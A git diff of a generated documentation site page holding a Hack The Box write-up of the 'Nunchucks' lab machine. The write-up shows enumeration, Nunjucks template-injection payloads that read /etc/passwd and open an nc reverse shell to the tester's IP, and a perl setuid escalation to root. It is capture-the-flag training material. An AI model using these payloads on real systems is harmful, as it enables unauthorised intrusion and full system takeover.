@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17092,37 +17115,49 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h1 id="nunchucks-a-hack-the-box-machine">Nunchucks - A Hack The Box machine</h1>
 <h2 id="users-flag">User's flag</h2>
 <h3 id="enumeration">Enumeration</h3>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="go">nmap -sC -sV 10.129.95.252 -Pn</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="go">nmap -sC -sV 10.129.95.252 -Pn</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Open ports: 22, 80, and 443.</p>
 <p>Also http://nunchucks.htb is in results.</p>
 <p>Adding IP and domain nunchucks.htb to /etc/hosts.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="go">whatweb http://nunchucks.htb </span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="go">whatweb http://nunchucks.htb </span>
+</span></code></pre></div></td></tr></table></div>
 <p>And some directory enumeration:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>feroxbuster -u https://nunchucks.htb -k
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>feroxbuster -u https://nunchucks.htb -k
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>200      GET      250l     1863w    19134c https://nunchucks.htb/Privacy
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>200      GET      245l     1737w    17753c https://nunchucks.htb/Terms
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>200      GET      183l      662w     9172c https://nunchucks.htb/login
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>200      GET      187l      683w     9488c https://nunchucks.htb/signup
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span>
+<span class="normal"><a href="#__codelineno-3-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>200      GET      250l     1863w    19134c https://nunchucks.htb/Privacy
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>200      GET      245l     1737w    17753c https://nunchucks.htb/Terms
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>200      GET      183l      662w     9172c https://nunchucks.htb/login
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>200      GET      187l      683w     9488c https://nunchucks.htb/signup
+</span></code></pre></div></td></tr></table></div>
 <p>Trying to login into the application or signing up returns the following response message:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>{&quot;response&quot;:&quot;We&#39;re sorry but user logins are currently disabled.&quot;}
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>{&quot;response&quot;:&quot;We&#39;re sorry but registration is currently closed.&quot;}
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>{&quot;response&quot;:&quot;We&#39;re sorry but user logins are currently disabled.&quot;}
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>{&quot;response&quot;:&quot;We&#39;re sorry but registration is currently closed.&quot;}
+</span></code></pre></div></td></tr></table></div>
 <p>Now, we will try some subdomain enumeration</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="go">wfuzz -c --hc 404 -t 200 -u https://nunchucks.htb/ -w /usr/share/dirb/wordlists/common.txt -H &quot;Host: FUZZ.nunchucks.htb&quot; --hl 546</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="gp"># </span>-c:<span class="w"> </span>Color<span class="w"> </span><span class="k">in</span><span class="w"> </span>output
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="gp"># </span>–hc<span class="w"> </span><span class="m">404</span>:<span class="w"> </span>Hide<span class="w"> </span><span class="m">404</span><span class="w"> </span>code<span class="w"> </span>responses
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="gp"># </span>-t<span class="w"> </span><span class="m">200</span>:<span class="w"> </span>Concurrent<span class="w"> </span>Threads
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="gp"># </span>-u<span class="w"> </span>http://nunchucks.htb/:<span class="w"> </span>Target<span class="w"> </span>URL
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="gp"># </span>-w<span class="w"> </span>/usr/share/dirb/wordlists/common.txt:<span class="w"> </span>Wordlist<span class="w"> </span>
-</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="gp"># </span>-H<span class="w"> </span>“Host:<span class="w"> </span>FUZZ.nunchucks.htb”:<span class="w"> </span>Header.<span class="w"> </span>Also<span class="w"> </span>with<span class="w"> </span><span class="s2">&quot;FUZZ&quot;</span><span class="w"> </span>we<span class="w"> </span>indicate<span class="w"> </span>the<span class="w"> </span>injection<span class="w"> </span>point<span class="w"> </span><span class="k">for</span><span class="w"> </span>payloads
-</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="gp"># </span>–hl<span class="w"> </span><span class="m">546</span>:<span class="w"> </span>Filter<span class="w"> </span>out<span class="w"> </span>responses<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span>specific<span class="w"> </span>number<span class="w"> </span>of<span class="w"> </span>lines.<span class="w"> </span>In<span class="w"> </span>this<span class="w"> </span><span class="k">case</span>,<span class="w"> </span><span class="m">546</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span>
+<span class="normal"><a href="#__codelineno-5-4">4</a></span>
+<span class="normal"><a href="#__codelineno-5-5">5</a></span>
+<span class="normal"><a href="#__codelineno-5-6">6</a></span>
+<span class="normal"><a href="#__codelineno-5-7">7</a></span>
+<span class="normal"><a href="#__codelineno-5-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="go">wfuzz -c --hc 404 -t 200 -u https://nunchucks.htb/ -w /usr/share/dirb/wordlists/common.txt -H &quot;Host: FUZZ.nunchucks.htb&quot; --hl 546</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="gp"># </span>-c:<span class="w"> </span>Color<span class="w"> </span><span class="k">in</span><span class="w"> </span>output
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="gp"># </span>–hc<span class="w"> </span><span class="m">404</span>:<span class="w"> </span>Hide<span class="w"> </span><span class="m">404</span><span class="w"> </span>code<span class="w"> </span>responses
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="gp"># </span>-t<span class="w"> </span><span class="m">200</span>:<span class="w"> </span>Concurrent<span class="w"> </span>Threads
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a><span class="gp"># </span>-u<span class="w"> </span>http://nunchucks.htb/:<span class="w"> </span>Target<span class="w"> </span>URL
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a><span class="gp"># </span>-w<span class="w"> </span>/usr/share/dirb/wordlists/common.txt:<span class="w"> </span>Wordlist<span class="w"> </span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7"></a><span class="gp"># </span>-H<span class="w"> </span>“Host:<span class="w"> </span>FUZZ.nunchucks.htb”:<span class="w"> </span>Header.<span class="w"> </span>Also<span class="w"> </span>with<span class="w"> </span><span class="s2">&quot;FUZZ&quot;</span><span class="w"> </span>we<span class="w"> </span>indicate<span class="w"> </span>the<span class="w"> </span>injection<span class="w"> </span>point<span class="w"> </span><span class="k">for</span><span class="w"> </span>payloads
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8"></a><span class="gp"># </span>–hl<span class="w"> </span><span class="m">546</span>:<span class="w"> </span>Filter<span class="w"> </span>out<span class="w"> </span>responses<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span>specific<span class="w"> </span>number<span class="w"> </span>of<span class="w"> </span>lines.<span class="w"> </span>In<span class="w"> </span>this<span class="w"> </span><span class="k">case</span>,<span class="w"> </span><span class="m">546</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Results: store</p>
 <p>We will add store.nunchucks.htb to /etc/hosts file.</p>
 <h3 id="exploitation">Exploitation</h3>
@@ -17134,32 +17169,44 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>Having a look at template engines in Express at <a href="https://expressjs.com/en/resources/template-engines.html">https://expressjs.com/en/resources/template-engines.html</a>, there exists a <strong><a href="https://github.com/mozilla/nunjucks">Nunjucks</a></strong>, which is close the domain name nunchucks. </p>
 <p>This blog post describe how we can exploit this vulnerability: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine</p>
 <p>Basically, I'm using the following payloads:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>{{range}}
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>{{range.constructor(\&quot;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;)\&quot;)()}}
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>{{range.constructor(\&quot;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;tail /etc/passwd&#39;)\&quot;)()}}
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
-</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>{{range.constructor(\&quot;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 1234 &gt;/tmp/f&#39;)\&quot;)()}}
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span>
+<span class="normal"><a href="#__codelineno-6-3">3</a></span>
+<span class="normal"><a href="#__codelineno-6-4">4</a></span>
+<span class="normal"><a href="#__codelineno-6-5">5</a></span>
+<span class="normal"><a href="#__codelineno-6-6">6</a></span>
+<span class="normal"><a href="#__codelineno-6-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>{{range}}
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>{{range.constructor(\&quot;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;)\&quot;)()}}
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>{{range.constructor(\&quot;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;tail /etc/passwd&#39;)\&quot;)()}}
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a>{{range.constructor(\&quot;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 1234 &gt;/tmp/f&#39;)\&quot;)()}}
+</span></code></pre></div></td></tr></table></div>
 <p>The last one is a reverse shell. Before running it in BurpSuite Repeater, I've setup my listener with netcat on port 1234.</p>
 <h2 id="roots-flag">Root's flag</h2>
 <h3 id="privileges-escalation">Privileges escalation</h3>
 <p>We'll abuse some <a href="../process-capabilities-getcap/">process capability vulnerability</a> to escalate to root. First we list processes capabilities:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>getcap -r 2&gt;/dev/null
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>getcap -r 2&gt;/dev/null
+</span></code></pre></div></td></tr></table></div>
 <p>Result:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>/usr/bin/perl = cap_setuid+ep
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>/usr/bin/mtr-packet = cap_net_raw+ep
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>/usr/bin/ping = cap_net_raw+ep
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>/usr/bin/traceroute6.iputils = cap_net_raw+ep
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span>
+<span class="normal"><a href="#__codelineno-8-3">3</a></span>
+<span class="normal"><a href="#__codelineno-8-4">4</a></span>
+<span class="normal"><a href="#__codelineno-8-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>/usr/bin/perl = cap_setuid+ep
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>/usr/bin/mtr-packet = cap_net_raw+ep
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>/usr/bin/ping = cap_net_raw+ep
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a>/usr/bin/traceroute6.iputils = cap_net_raw+ep
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+</span></code></pre></div></td></tr></table></div>
 <p>We will use perl binary to escalate. </p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>echo -ne &#39;#!/bin/perl \nuse POSIX qw(setuid); \nPOSIX::setuid(0); \nexec &quot;/bin/bash&quot;;&#39; &gt; pay.pl
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>chmod +x pay.pl
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>./pay.pl
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span>
+<span class="normal"><a href="#__codelineno-9-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>echo -ne &#39;#!/bin/perl \nuse POSIX qw(setuid); \nPOSIX::setuid(0); \nexec &quot;/bin/bash&quot;;&#39; &gt; pay.pl
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>chmod +x pay.pl
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>./pay.pl
+</span></code></pre></div></td></tr></table></div>
 <p>And you are root.</p>
 
 <!-- This section adds support for localized revision dates -->
@@ -17236,7 +17283,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
